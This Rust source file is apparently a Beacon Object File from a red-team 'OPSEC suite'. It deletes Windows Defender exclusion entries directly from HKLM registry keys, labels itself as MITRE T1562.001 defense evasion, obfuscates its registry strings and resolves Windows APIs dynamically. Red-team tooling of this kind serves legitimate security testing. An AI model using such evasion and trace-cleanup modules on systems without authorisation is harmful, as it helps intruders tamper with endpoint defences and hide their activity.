// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
//
//! Remove a Windows Defender exclusion directly from the registry.
//!
//! Registry paths:
//!   HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths
//!   HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions
//!   HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes
//!
//! Args: <type: paths|extensions|processes> <value>
//!
//! MITRE ATT&CK: T1562.001 (Impair Defenses: Disable or Modify Tools)
#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use alloc::string::String;
use common::{mitre::Technique, dfr_fn, obf};

const TECHNIQUES: &[Technique] = &[
    Technique {
        id: "T1562.001",
        name: "Impair Defenses: Disable or Modify Tools",
        tactic: "Defense Evasion",
    },
];

const HKEY_LOCAL_MACHINE: isize = 0x8000_0002u32 as i32 as isize;
const KEY_ALL_ACCESS: u32 = 0xF003F;
const ERROR_SUCCESS: u32 = 0;

dfr_fn!(
    reg_open_key_ex_a(
        hkey: isize, subkey: *const i8, options: u32,
        sam_desired: u32, result: *mut isize,
    ) -> u32,
    module = "advapi32.dll",
    api    = "RegOpenKeyExA"
);

dfr_fn!(
    reg_delete_value_a(hkey: isize, value_name: *const i8) -> u32,
    module = "advapi32.dll",
    api    = "RegDeleteValueA"
);

dfr_fn!(
    reg_close_key(hkey: isize) -> u32,
    module = "advapi32.dll",
    api    = "RegCloseKey"
);

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    let mut parser = rustbof::data::DataParser::new(args, len);
    match run(&mut parser) {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
    let excl_type  = String::from(parser.get_str());
    let excl_value = String::from(parser.get_str());

    if excl_type.is_empty() || excl_value.is_empty() {
        return Err("usage: del-exclusion <paths|extensions|processes> <value>");
    }

    // Map type arg to registry subkey name (obfuscated base path)
    obf! { let base = "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\"; }

    let subkey_name = if excl_type.eq_ignore_ascii_case("extensions") {
        "Extensions"
    } else if excl_type.eq_ignore_ascii_case("processes") {
        "Processes"
    } else {
        "Paths"
    };

    // Build full key path: base + subkey_name
    let mut key_buf = [0i8; 128];
    let mut kpos = 0usize;
    for b in base.bytes()    { if kpos + 1 < key_buf.len() { key_buf[kpos] = b as i8; kpos += 1; } }
    for b in subkey_name.bytes() { if kpos + 1 < key_buf.len() { key_buf[kpos] = b as i8; kpos += 1; } }

    let mut val_cstr = [0i8; 520];
    for (i, b) in excl_value.bytes().enumerate() {
        if i + 1 < val_cstr.len() { val_cstr[i] = b as i8; }
    }

    let mut hkey: isize = 0;
    let rc = unsafe {
        reg_open_key_ex_a(HKEY_LOCAL_MACHINE, key_buf.as_ptr(), 0, KEY_ALL_ACCESS, &mut hkey)
    }.map_err(|_| "resolve failed")?;

    if rc != ERROR_SUCCESS {
        return Err("exclusion key open failed");
    }

    let rc2 = unsafe {
        reg_delete_value_a(hkey, val_cstr.as_ptr())
    }.map_err(|_| "resolve failed")?;

    let _ = unsafe { reg_close_key(hkey) };

    if rc2 != ERROR_SUCCESS {
        return Err("exclusion value not found or delete failed");
    }

    println!("[+] exclusion removed: {} ({})", excl_value, subkey_name);
    Ok(())
}
